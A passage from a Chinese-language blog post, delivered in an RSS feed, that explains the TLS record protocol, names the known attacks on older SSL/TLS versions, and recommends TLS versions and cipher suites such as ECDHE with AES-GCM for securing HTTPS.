客户端加密密钥及IV:Enc.key</p><p>(4) 服务器端加密密钥及IV:Enc.key,IV</p><p>(5) 客户端分组密码需要的IV</p><p>(6) 服务器端分组密码需要的IV</p><p><img src="/2020/08/26/apple/1598427757814.png" alt="1598427757814"> </p><p><img src="/2020/08/26/apple/1598427767706.png" alt="1598427767706"></p><h3 id="2-7-记录协议"><a href="#2-7-记录协议" class="headerlink" title="2.7  记录协议"></a>2.7  记录协议</h3><p>记录协议负责在传输连接上交换的所有底层消息，并且可以配置加密。每一条 TLS 记录以一个短标头开始。标头包含记录内容的类型 (或子协议)、协议版本和长度。原始消息经过分段 (或者合并)、压缩、添加认证码、加密转为 TLS 记录的数据部分。 如下图所示.对应用数据进行分段,对分段信息先压缩,在加上对压缩进行的MAC,然后对压缩信息+MAC进行加密,最后加记录头,形成报文,发送.</p><p><img src="/2020/08/26/apple/1597653267305.png" alt="1597653267305"></p><p>报文如下:</p><p><img src="/2020/08/26/apple/1597653406484.png" alt="1597653406484"></p><h2 id="3-https-安全性分析"><a href="#3-https-安全性分析" class="headerlink" title="3 https 安全性分析"></a>3 https 安全性分析</h2><h3 id="3-1-TLS版本的选择"><a href="#3-1-TLS版本的选择" class="headerlink" title="3.1 TLS版本的选择"></a>3.1 TLS版本的选择</h3><p>目前在SSL/TLS家族中主要有7个协议: SSL v2, SSL v3, TLS v1.0, TLS v1.1, TLS v1.2和TLSv1.3。</p><p>1 SSL v2, SSL v3, TLS v1.0 , TLS v1.1协议均有明确的安全缺陷</p><ol><li><p>SSL v2: DROWN攻击</p></li><li><p>SSL v3: POODLE攻击</p></li><li><p>TLS v1.0: BEAST和POODLE攻击</p></li><li><p>TLS v1.1 密码套件较老,已不安全 </p></li></ol><p>2、TLS v1.2与v1.3目前均无已知的安全缺陷</p><p><strong>推荐使用TLS v1.2与v1.3.</strong></p><h3 id="3-2-密码套件的选择"><a href="#3-2-密码套件的选择" class="headerlink" title="3.2 密码套件的选择"></a>3.2 密码套件的选择</h3><h4 id="3-2-1-根据证书去选择密码套件"><a href="#3-2-1-根据证书去选择密码套件" class="headerlink" title="3.2.1 根据证书去选择密码套件"></a>3.2.1 根据证书去选择密码套件</h4><p>当服务器配置ECC证书时，加密套件只能选择XXX_ECDSA_XXX或者ECDH_XXX。</p><p>当服务器配置RSA证书时，只能选择RSA_XXX或者ECDHE_RSA_XXX形式的加密套件。</p><p>需要注意的是，如果加密套件选择ECDH_RSA或者ECDH_ECDSA时，由于ECDH加密套件默认表明了握手需要ECC证书（即ECC证书的公钥充当握手中server key exchange中的公钥，证书的私钥同样也是握手过程中的私钥，握手过程不需要server key exchange），所有第二部分RSA和ECDSA表明的是想要的上级签发该类型的服务器证书。</p><p>如果加密套件选择ECDHE_XXXX，则第二部分RSA和ECDSA指的是用来签名握手中server key exchange中传过来的秘密值的签名算法。</p><h4 id="3-2-2从密码套件的各个部分去分析其安全性-具体如下"><a href="#3-2-2从密码套件的各个部分去分析其安全性-具体如下" class="headerlink" title="3.2.2从密码套件的各个部分去分析其安全性,具体如下:"></a>3.2.2从密码套件的各个部分去分析其安全性,具体如下:</h4><p>(1)密钥交换：ECDHE，DHE，ECDH，DHE，ADH, RSA, PSK</p><p>其中RSA，ECDH，DH，PSK均不具有前向安全性，一旦私钥丢失，则以往所有的通信内容将会泄露，使用前向安全性算法（ECDHE，DHE），可以避免这种问题。</p><p>ADH为Anonymous DH，匿名DH算法，不提供身份验证，禁用。</p><p>PSK算法是预存key在客户端和服务端，因为PSK必须要预置密钥，这个预置的过程就代表了服务端已经知道有哪些客户端需要访问了，所以基于PSK的TLS适合在内部系统中使用，而不适合在公网环境用来提供Web服务。</p><p><strong>综上,推荐使用的密钥交换算法为:ECDHE，DHE</strong></p><p>(2)数字签名：ECDSA, RSA(2048位以上), DSS (又称DSA)</p><p>其中DSA只支持1024bits，不安全算法,RSA要2048位以上才安全.ECDSA速度较快,安全性也较高.</p><p><strong>推荐使用数字签名算法ECDSA和RSA.</strong></p><p>(3) 加密算法：<strong>DES，3DES ,**AES(256),ChaCha20</strong>,RC4, **ChaCha20</p><p>3DES运行缓慢且易被攻击。RC4已不安全</p><p>ChaCha20是一种流加密算法，实现较为简单，并且比纯软件实现的AES性能更好。</p><p>在支持AES指令的硬件平台上，推荐优先选择AES-GCM算法,不支持AES指令的硬件平台，ChaCha20性能优于AES</p><p>Camellia算法支持128比特的分组长度,128、192和256比特的密钥与AES的接口相同，Camellia算法128比特密钥的加、解密过程共有18轮,采用Feistel结构,加、解密过程完全相同,只是子密钥注入顺序相反</p><p>Camellia算法由NTT和Mitsubishi Electric Corporation于2000年联合开发，作为欧洲新一代的加密标准。与AES算法相比,Camellia算法在各种软硬件平台上表现出与之相当的加密速度。除了在各种软件和硬件平台上的高效性这一显著特点,它的另外一个特点是针对小规模硬件平台的设计.</p><p><strong>推荐使用AES(256),ChaCha20ChaCha20</strong></p><p>(4)<strong>工作模式：</strong>CBC，GCM</p><p>CBC 模式密码 —— 易受 BEAST 和 Lucky 13 攻击,禁用</p><p><strong>推荐使用:GCM</strong></p><p>(5)MAC：md5，SHA-1（又名SHA），SHA-2（又名SHA128，SHA256和SHA384）</p><p>​     SHA1存在碰攻击，如果HTTPS证书使用sha1，扩展存在中间人攻击；  Md5也被破解</p><p><strong>推荐使用SHA256和SHA384</strong></p><h3 id="3-3-优先使用的密码套件"><a href="#3-3-优先使用的密码套件" class="headerlink" title="3.3 优先使用的密码套件"></a>3.3 优先使用的密码套件</h3><p>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384<br>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384<br>TLS_DHE_RSA_WITH_AES_128_GCM_SHA256<br>TLS_DHE_RSA_WITH_AES_256_GCM_SHA384</p><h2 id="REF"><a href="#REF" class="headerlink" title="REF:"></a>REF:</h2><p> <a href="https://cshihong.github.io/2019/05/09/SSL%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/">https://cshihong.github.io/2019/05/09/SSL%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</a> </p><p> <a href="https://juejin.im/post/6844903667577929742#heading-12">https://juejin.im/post/6844903667577929742#heading-12</a> </p><p> <a href="https://www.jianshu.com/p/cf8c2f2cd18a">https://www.jianshu.com/p/cf8c2f2cd18a</a> </p><p> <a href="https://www.cnblogs.com/zhuqil/archive/2012/10/06/ssl_detail.html">https://www.cnblogs.com/zhuqil/archive/2012/10/06/ssl_detail.html</a> </p><p> <a href="https://blog.csdn.net/mrpre/article/details/77868570">https://blog.csdn.net/mrpre/article/details/77868570</a> </p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">网络编程</category>
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/08/26/apple/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
